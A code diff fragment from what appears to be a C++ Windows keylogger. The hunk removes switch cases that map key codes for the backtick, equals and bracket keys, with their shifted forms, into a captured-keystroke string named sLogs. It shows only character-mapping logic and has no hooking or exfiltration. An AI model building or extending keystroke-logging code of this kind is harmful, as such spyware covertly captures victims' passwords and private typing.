@@ -731,56 +731,6 @@ int save(const int key)
 				sLogs += "z";
 			}
 		}
-	//
-	case 192:
-		::backspace = 0;
-		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
-		{
-			sLogs += "~";
-			break;
-		}
-		else
-		{
-			sLogs += "`";
-		}
-		break;
-	case 187:
-		::backspace = 0;
-		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
-		{
-			sLogs += "+";
-			break;
-		}
-		else
-		{
-			sLogs += "=";
-		}
-		break;
-	case 219:
-		::backspace = 0;
-		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
-		{
-			sLogs += "{";
-			break;
-		}
-		else
-		{
-			sLogs += "[";
-		}
-		break;
-	case 221:
-		::backspace = 0;
-		if (GetAsyncKeyState(VK_SHIFT) || GetAsyncKeyState(VK_RSHIFT))
-		{
-			sLogs += "}";
-			break;
-		}
-		else
-		{
-			sLogs += "]";
-		}
-		break;
-	//
 	//Decimal key codes
 	case 13:
 		::backspace = 0;
